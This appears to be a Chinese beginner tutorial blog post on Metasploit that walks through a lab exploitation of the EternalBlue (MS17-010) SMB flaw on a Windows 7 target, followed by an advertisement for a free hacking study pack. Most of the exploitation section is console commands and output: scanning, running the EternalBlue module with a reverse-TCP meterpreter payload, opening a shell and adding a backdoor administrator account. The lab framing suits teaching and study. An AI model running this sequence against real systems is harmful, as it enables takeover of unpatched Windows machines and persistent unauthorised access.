#  MSF使用教程永恒之蓝漏洞扫描与利用【黑客渗透测试零基础入门必知必会】   
龙哥  龙哥网络安全   2024-09-26 10:01  
  
前言  
### 1 MSF框架  
#### 1.1 MSF简介  
1. Metasploit框架（Metasploit Framework, MSF）是一个开源工具，旨在方便渗透测试，它是由Ruby程序语言编写的模板化框架，具有很好的扩展性，便于渗透测试人员开发、使用定制的工具模板。  
  
1. Metasploit可向后端模块提供多种用来控制测试的接口（如控制台、 Web 、 CLI ）。推荐使用控制台接口，通过控制台接口，你可以访问和使用所有Metasploit的插件，例如Payload、利用模块、 Post模块等。Metasploit还有第三方程序的接口，例如Nmap、SQLMap 等，可以直接在控制台接口里使用，要访问该界面。  
  
#### 1.2 MSF五大模块类型  
1. Auxiliaries（辅助模块）该模块不会直接在测试者和目标主机之间建立访问，它们只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试。  
  
1. Exploit（漏洞利用模块）漏洞利用是指由渗透测试者利用 一个系统、应用或者服务中的安全漏洞进行的攻击行为 。流行的渗透攻击技术包括缓冲区溢出、 Web应用程序攻击，以及利用配置错误等，其中包含攻击者或测试人员针对系统中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码，每个漏洞都有相应的攻击代码 。  
  
1. Payload（攻击载荷模块）攻击载荷是我们期望目标系统在被渗透攻击之后完成实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，在Metasploit框架中可以自由地选择、传送和植入 。攻击载荷也可能是简单地在目标操作系统上执行一些命令，如添加用户账号等 。  
  
1. Post（后期渗透模块）该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等。  
  
1. Encoders（编码工具模块）该模块在渗透测试中负责免杀，以防止被杀毒软件、防火墙、 IDS及类似的安全软件检测出来。  
  
#### 1.3 渗透攻击步骤  
  
使用MSF渗透测试时，可以综合使用以上模块，对目标系统进行侦察并发动攻击，大致的步骤如下所示。  
1. 扫描目标机系统，寻找可用漏洞。  
  
1. 选择并配置一个漏洞利用模块。  
  
1. 选择并配置一个攻击载荷模块。  
  
1. 选择一个编码技术，用来绕过杀毒软件的查杀 。  
  
1. 渗透攻击。  
  
#### 1.4 小结  
  
“理论联系实际”是最好的学习方法，我们已经大概了解了 MSF渗透攻击的基础知识，下面进行一次简单的渗透实验来熟悉整个过程。  
### 2 实验简介  
#### 2.1 永恒之蓝简介  
1. 背景：永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该病毒出来不久就被微软通过打补丁修复。  
  
1. 原理：永恒之蓝是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。通过永恒之蓝漏洞会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。  
  
#### 2.2 实验环境  
1. 靶机1：win7系统，IP地址为192.168.1.7。  
  
1. 靶机2：winxp系统，IP地址为192.168.1.9。  
  
1. 攻击者：kali系统（自带MSF框架）。  
  
1. 保证两者可以ping通。  
  
#### 2.3 实验目的  
1. 了解MSF的功能及使用过程。  
  
1. 复现永恒之蓝漏洞的攻击过程。  
  
### 3 实验前准备  
#### 3.1 MSF启动、退出、更新  
1. msfconsole：启动MSF框架。  
  
1. exit：退出MSF框架。也可以使用快捷键Ctrl+\。  
  
1. back：退出到上一级。  
  
1. apt-get update ：同步 /etc/apt/sources.list 和 /etc/apt/sources.list.d 中列出的源的索引，这样才能获取到最新的软件包。。  
  
1. apt-get upgrade：使用该命令前要先使用update。升级系统上安装的所有软件包，若更新失败，所涉及的包会保持更新之前的状态 。  
  
1. apt-get dist-upgrade：升级整个Linux 系统，例如从Kali Linux 1.0.1 升级到 Kali Linux 1.0.2（不仅能够升级所有己安装的软件包 ，而且会处理升级过程中可能出现的软件冲突 。某些情况下，它的部分升级过程需要人工参与）。  
  
1. 上述的升级是比较全面且彻底的，但是要花费较多时间，建议在空闲时间使用，如果急需使用MSF又需要更新，建议采用单独升级的方式，先使用 apt update 再使用 apt install metasploit-framework。  
  
#### 3.2 MSF启动与更新实操  
1. 进入kali虚拟机，打开终端，输入msfconsole，进入MSF框架。执行过程如下，可以看到当前版本为6.1.14。  
  
```
┌──(root💀kali)-[~]
└─# msfconsole

================================================================================
=====================+--------------------------------+=========================
=====================| Session one died of dysentery. |=========================
=====================+--------------------------------+=========================
================================================================================
                     Press ENTER to size up the situation
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
                        Press SPACE BAR to continue

       =[ metasploit v6.1.14-dev                          ]
+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command



```  
1. 输入命令exit退出MSF框架，来进行框架升级。  
  
1. 使用MSF之前，最好将其更新，以获取更多漏洞模块的支持。先使用apt update，再使用apt install metasploit-framework。  
  
1. 再次输入命令msfconsole，查询更新后版本，执行过程如下。可以看到版本已更新到6.1.30，响应EXP等利用模块均增加了。  
  
```
┌──(root💀kali)-[~]
└─# msfconsole

       =[ metasploit v6.1.30-dev                          ]
+ -- --=[ 2200 exploits - 1165 auxiliary - 395 post       ]
+ -- --=[ 596 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command



```  
### 4 主机扫描  
  
扫描和收集信息是渗透测试中的第一步，其主要目标是尽可能多地发现有关目标机器的信息。获取的信息越多，渗透的概率就越大。该步骤的主要关注点是目标机器IP地址、可用服务、开放端口等。  
#### 4.1 使用辅助模块进行端口扫描  
1. 辅助模块是MSF的内置模块，首先利用search portscan命令查询一下有哪些可用的端口扫描模块，执行过程如下。msf6 > search portscan  
  
```
Matching Modules
================
   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator

Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access                                                        

msf6 >



```  
1. 在上述结果中，可以看到有8个可用的端口扫描模块，此处以tcp端口扫描模块为例进行扫描。输入命令use auxiliary/scanner/portscan/tcp进入对应模块（看>号前面的内容就知道自己所处模块位置），再输入show options查询对应模块需要使用的参数。  
  
```
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > show options
                                                                                                                                           
Module options (auxiliary/scanner/portscan/tcp):                                                                                           

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf6 auxiliary(scanner/portscan/tcp) >



```  
1. 在上述参数中，Required列，被标记为yes的参数必须包含实际的值，其中，除了RHOSTS外，其余参数均有默认值。THREADS设置扫描线程数量，默认为1，数量越高扫描越快。使用set命令设置某个参数值，可以使用unset命令取消某个参数值的设置，设置完毕后使用run命令执行模块，可以看到扫描结果如下，  
445端口存在可能利用的永恒之蓝漏洞。  
  
```
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.7
RHOSTS => 192.168.1.7
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 16
THREADS => 16
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.168.1.7:          - 192.168.1.7:135 - TCP OPEN
[+] 192.168.1.7:          - 192.168.1.7:139 - TCP OPEN
[+] 192.168.1.7:          - 192.168.1.7:445 - TCP OPEN
[+] 192.168.1.7:          - 192.168.1.7:5357 - TCP OPEN
[*] 192.168.1.7:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) >



```  
1. 其实还有两条可选命令：setg命令和unsetg命令 。二者用于在msfconsole中设置或者取消设置全局性的参数值，从而避免重复输入相同的值。  
  
#### 4.2 使用辅助模块进行服务扫描  
1. 在扫描目标机器上运行的服务时，有多种基于服务的扫描技术可供选择，例如VNC 、FTP 、SMB等，只需执行特定类型的扫描就可以发现服务。  
  
1. 使用命令search scanner可以发现大量的扫描模块，约有600多个，建议读者多尝试不同的辅助扫描模块，了解其用法。  
  
1. 使用search scanner/smb搜索与SMB服务相关的模块，搜索结果如下。使用的步骤与使用端口扫描模块时的基本相同，就不再演示了。  
  
```
msf6 > search scanner/smb

Matching Modules
================
   #   Name                                         Disclosure Date  Rank    Check  Description
   -   ----                                         ---------------  ----    -----  -----------
   0   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal  No     DCOM Exec
   1   auxiliary/scanner/smb/impacket/secretsdump                    normal  No     DCOM Exec
   2   auxiliary/scanner/smb/smb_ms17_010                            normal  No     MS17-010 SMB RCE Detection
   3   auxiliary/scanner/smb/psexec_loggedin_users                   normal  No     Microsoft Windows Authenticated Logged In Users Enumeration
   4   auxiliary/scanner/smb/smb_enumusers_domain                    normal  No     SMB Domain User Enumeration
   5   auxiliary/scanner/smb/smb_enum_gpp                            normal  No     SMB Group Policy Preference Saved Passwords Enumeration
   6   auxiliary/scanner/smb/smb_login                               normal  No     SMB Login Check Scanner
   7   auxiliary/scanner/smb/smb_lookupsid                           normal  No     SMB SID User Enumeration (LookupSid)
   8   auxiliary/scanner/smb/pipe_auditor                            normal  No     SMB Session Pipe Auditor
   9   auxiliary/scanner/smb/pipe_dcerpc_auditor                     normal  No     SMB Session Pipe DCERPC Auditor
   10  auxiliary/scanner/smb/smb_enumshares                          normal  No     SMB Share Enumeration
   11  auxiliary/scanner/smb/smb_enumusers                           normal  No     SMB User Enumeration (SAM EnumUsers)
   12  auxiliary/scanner/smb/smb_version                             normal  No     SMB Version Detection
   13  auxiliary/scanner/smb/smb_uninit_cred                         normal  Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   14  auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal  No     WMI Exec



```  
#### 4.3 使用 Nmap 扫描  
1. 在Metasploit中同样可以使用Nmap扫描，它不仅可以用来确定目标网络上计算机的存活状态，而且可以扫描计算机的操作系统、开放端口、服务等。熟练掌握Nmap的用法可以极大地提高个人的渗透测试技术。  
  
1. 在MSF框架中可以直接使用Nmap，输入命令nmap -A 192.168.1.7对靶机进行全面扫描，过程如下，可以看到445端口开启着，可能存在利用永恒之蓝漏洞。  
  
```
msf6 > nmap -A 192.168.1.7
[*] exec: nmap -A 192.168.1.7

Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-27 00:52 EDT
Nmap scan report for 192.168.1.7 (192.168.1.7)
Host is up (0.00074s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7600 microsoft-ds (workgroup: WORKGROUP)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 00:0C:29:F2:1D:C2 (VMware)
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: Host: DU-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -2h39m58s, deviation: 4h37m07s, median: 0s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7600 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-:professional
|   Computer name: du-PC
|   NetBIOS computer name: DU-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-03-27T12:53:38+08:00
| smb2-time: 
|   date: 2022-03-27T04:53:38
|_  start_date: 2022-03-26T15:18:54
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: DU-PC, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:f2:1d:c2 (VMware)

TRACEROUTE
HOP RTT     ADDRESS
1   0.74 ms 192.168.1.7 (192.168.1.7)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.55 seconds
msf6 >



```  
### 5 漏洞探测及利用  
#### 5.1 漏洞探测  
1. 在上述信息收集中，我们发现445端口开启，代表着目标靶机运行者SMB服务，这给我们提供了下一步分析了利用的方向。本节内容主要围绕永恒之蓝漏洞展开，因此使用命令search sm17_010查询与永恒之蓝相关的可利用模块，发现公有4个模块，辅助模块和利用模块各两个。  
  
```
msf6 > search ms17_010

Matching Modules
================
   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/smb/smb_ms17_010



```  
1. 端口开启不代表就存在永恒之蓝漏洞，因此我们还需要借助更具体的扫描模块来检验是否存在永恒之蓝漏洞，使用命令use auxiliary/scanner/smb/smb_ms17_010进入永恒之蓝漏洞扫描模块，输入参数options查看所需参数。  
  
```
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                               Required  Description
   ----         ---------------                               --------  -----------
   CHECK_ARCH   true                                          no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                          no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                         no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlis  yes       List of named pipes to check
                ts/named_pipes.txt
   RHOSTS                                                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using
                                                                        -Metasploit
   RPORT        445                                           yes       The SMB service port (TCP)
   SMBDomain    .                                             no        The Windows domain to use for authentication
   SMBPass                                                    no        The password for the specified username
   SMBUser                                                    no        The username to authenticate as
   THREADS      1                                             yes       The number of concurrent threads (max one per host)



```  
1. 在参数查询结果中，可以看到必填项中有RHOSTS还未设置信息，使用set命令设置参数后使用run命令运行该模块。在运行结果的第一行中，Host is likely VULNERABLE to MS17-010!表示主机可能会受到ms17-010漏洞的伤害，也就是存在该漏洞。  
  
```
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.7
RHOSTS => 192.168.1.7
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 192.168.1.7:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7600 x64 (64-bit)
[*] 192.168.1.7:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed



```  
#### 5.2 漏洞利用  
1. 到此，我们从发现445端口开启，到验证永恒之蓝漏洞的存在，下一步就是漏洞利用，在前面我们已经搜索到永恒之蓝的两个漏洞利用模块，此处使用第一个进行测试。使用命令use exploit/windows/smb/ms17_010_eternalblue进入该模块，并输入命令options查看所需参数。  
  
```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Win dows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.128    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



```  
1. 在参数查询结果中，可以看到必填项中有RHOSTS还未设置信息，使用set命令设置参数后使用run命令运行该模块。可以看到漏洞已经利用成功，接下去就可以设置用户及其他留后门的手段了。  
  
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.7
RHOSTS => 192.168.1.7
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.1.128:4444 
[*] 192.168.1.7:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.7:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7600 x64 (64-bit)
[*] 192.168.1.7:445       - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.1.7:445 - The target is vulnerable.
[*] 192.168.1.7:445 - Connecting to target for exploitation.
[+] 192.168.1.7:445 - Connection established for exploitation.
[+] 192.168.1.7:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.7:445 - CORE raw buffer dump (27 bytes)
[*] 192.168.1.7:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 192.168.1.7:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 30                 sional 7600     
[+] 192.168.1.7:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.7:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.1.7:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.7:445 - Starting non-paged pool grooming
[+] 192.168.1.7:445 - Sending SMBv2 buffers
[+] 192.168.1.7:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.7:445 - Sending final SMBv2 buffers.
[*] 192.168.1.7:445 - Sending last fragment of exploit packet!
[*] 192.168.1.7:445 - Receiving response from exploit packet
[+] 192.168.1.7:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.7:445 - Sending egg to corrupted connection.
[*] 192.168.1.7:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 192.168.1.7
[*] Meterpreter session 1 opened (192.168.1.128:4444 -> 192.168.1.7:49165 ) at 2022-03-27 01:46:05 -0400
[+] 192.168.1.7:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.7:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.7:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >



```  
1. GetShell。输入命令shell来让靶机反弹shell到当前窗口。GetShell成功。  
  
```
meterpreter > shell
Process 2684 created.
Channel 1 created.
Microsoft Windows [�汾 6.1.7600]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32>



```  
1. 创建用户并提权为管理员。  
  
```
C:\Windows\system32>net user hacker 123456 /add           
net user hacker 123456 /add
�����ɹ����ɡ�

C:\Windows\system32>net localgroup /add administrators hacker
net localgroup /add administrators hacker
�����ɹ����ɡ�

C:\Windows\system32>



```  
1. 验证：在win7的终端，输入net user查询用户列表，可以看到hacker用户已经在其中。  
  
  
1. ![](https://mmbiz.qpic.cn/sz_mmbiz_png/71ibgGpZLr2VqJVJSCjDLWCkyZvHFNn3HEQKfpZicqlXND0ia4WBcqaLyA1yFfrK47RZrjb9hBicTicUN0sQRt9rZicg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
#### 5.3 小结  
  
至此，已经完成了对该漏洞的检验与利用。  
### 6 总结  
1. 了解MSF框架的使用方法。  
  
1. 了解永恒之蓝漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TiaI8Dth4IiaRCFva2ZibMZKuNBEDOAEmkUpM9icw4W4c0uuBMyX29u6qckgJ1Wb7jGgw9K61mqLhzlnsSFAtE78ibQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**网络安全学习包**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TiaI8Dth4IiaRCFva2ZibMZKuNBEDOAEmkUGiakynth3MRTicLcHaV4MAvjubiaIicUx4ZrMxuSdSicjzT5HfEAzJy782g/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TiaI8Dth4IiaRCFva2ZibMZKuNBEDOAEmkU7VZiaRU6vdoIQC9ToNyrFNvkWmp92gn3R2RWyGVEiaxjTlDjic3dPsW6g/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**资料目录**  
1. 成长路线图&学习规划  
  
1. 配套  
视频教程  
  
1. SRC&黑客文籍  
  
1. 护网行动资料  
  
1. 黑客必读书单  
  
1. 面试题合集  
  
  
  
**282G**  
《**网络安全/黑客技术入门学习大礼包**  
》，可以**扫描下方二维码免费领取**  
！  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7O8nPRxfRT4Zy8efCHagq54hvWttN7A4N5KvFOGmvfiaMJ8yTWJjx3dsmfCPMG5RKqacW5TnZKrPatrickn8pRcw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
1.成长路线图&学习规划  
  
要学习一门新的技术，作为新手一定要**先学习成长路线图**，**方向不对，努力白费**。  
  
对于从来没有接触过网络安全的同学，我们帮你准备了详细的学习成长路线图&学习规划。可以说是最科学最系统的学习路线，大家跟着这个大的方向学习准没问题。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/71ibgGpZLr2W93cZWq7t2hVfaCvicInAznWcibcMdSKWsxbRn4qOUH3FiapXR7WicIiaRXx4lp8bNDnKTndzOPmKjERg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/evTLxnBbHv6fa8BCJ5052WLSGZjTIfEDgymVV6FeniaFszgpka15xzMolFmtXDdiaaDJMwXSqTQgRgBicvbYv4tNw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
2.视频教程  
  
很多朋友都不喜欢  
**晦涩的文字**  
，我也为大家准备了视频教程，其中一共有  
**21个章节**  
，每个章节都是  
**当前板块的精华浓缩**  
。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/NAkrkExZ3dnMVja8hzZpia0AkKu6AWrQn8E3Yp6lXhRo3D1Bttpiao3a0poRH29MC1MBC0hk5gKMCiaicy3wOiaUviag/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/NAkrkExZ3dnMVja8hzZpia0AkKu6AWrQnHBEMEd0W8dr6zFFQetPOhwiax5u8YYm0YZtWJSmyJ7d85QmuVQEicLVQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
3.SRC&黑客文籍  
  
大家最喜欢也是最关心的  
**SRC技术文籍&黑客技术**也有收录  
  
**SRC技术文籍：**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/NAkrkExZ3dkY8ctWgyFKc2oWZY3ibCDm5lMpjofvtGCicHTLibsOF8b841UOfozGsdjDvJKiaFgibdTunKlgC9kzrTQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
**黑客资料由于是敏感资源，这里不能直接展示哦！**  
  
  
4.护网行动资料  
  
  
其中关于  
**HW护网行动，也准备了对应的资料，这些内容可相当于比赛的金手指！**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/NAkrkExZ3dnMVja8hzZpia0AkKu6AWrQnaPKJSI9dNKiaR4vaJf0hqApKNbJeZnCpsQSElEicDrlAMLkRXHoyKN8A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
5.黑客必读书单  
  
****  
6.面试题合集  
  
  
当你自学到这里，你就要开始  
**思考找工作**  
的事情了，而工作绕不开的就是  
**真题和面试题。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/NAkrkExZ3dnMVja8hzZpia0AkKu6AWrQnXxPNhSSySbwUMEWOicYYS62D1UOQExv0cYuVQ68gk2uFF2xJ4TPmRHA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
**更多内容为防止和谐，可以扫描获取~**  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/NAkrkExZ3dnMVja8hzZpia0AkKu6AWrQnGktIUCicPreibR6b3sx1Qu0CsCZP0sZtCP4RHlMdxXuE4icCFSoL2yyBg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
朋友们需要全套共  
**282G**  
的《**网络安全/黑客技术入门学习大礼包**  
》，可以**扫描下方二维码免费领取**  
！  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7O8nPRxfRT4Zy8efCHagq54hvWttN7A4N5KvFOGmvfiaMJ8yTWJjx3dsmfCPMG5RKqacW5TnZKrPatrickn8pRcw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/TiaI8Dth4IiaRCFva2ZibMZKuNBEDOAEmkULH6MxzBRGa9Fibvuic8pv9cEjY0HWQbamrjGDz4jUgPS7TpprXiagZe6A/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**END**  
  
  
  
  
